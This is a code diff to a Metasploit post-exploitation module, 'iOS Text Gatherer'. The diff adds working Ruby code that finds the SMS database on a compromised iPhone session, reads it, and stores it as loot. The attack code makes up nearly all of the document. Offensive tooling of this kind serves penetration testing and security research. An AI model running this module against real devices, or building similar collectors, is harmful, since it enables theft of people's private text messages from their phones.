@@ -11,7 +11,8 @@ class MetasploitModule < Msf::Post
     super(update_info(info,
       'Name'          =>  'iOS Text Gatherer',
       'Description'   =>  %q{
-        This module collects images and text messages from iPhones.
+        This module collects text messages from iPhones.
+        Tested on iOS 10.3.3 on an iPhone 5.
       },
       'License'       =>  MSF_LICENSE,
       'Author'        =>  [ 'Shelby Pace' ], # Metasploit Module
@@ -20,7 +21,25 @@ class MetasploitModule < Msf::Post
     ))
   end
 
-  def run
+  def check_for_sms_file(file_path)
+    file?(file_path)
+  end
 
+  def download_text_db(file_path)
+    db_file_data = read_file(file_path)
+    loc = store_loot('sms.db.file', 'text/plain', session, db_file_data, 'sms.db')
+    print_good("sms.db stored at #{loc}")
+    rescue
+      fail_with(Failure::NoAccess, "Failed to read sms.db file")
+  end
+
+  def run
+    sms_path = '/private/var/mobile/Library/SMS/sms.db'
+    unless check_for_sms_file(sms_path)
+      fail_with(Failure::NotFound, "Couldn't locate sms.db file")
+    end
+
+    print_good('sms.db file found')
+    download_text_db(sms_path)
   end
 end
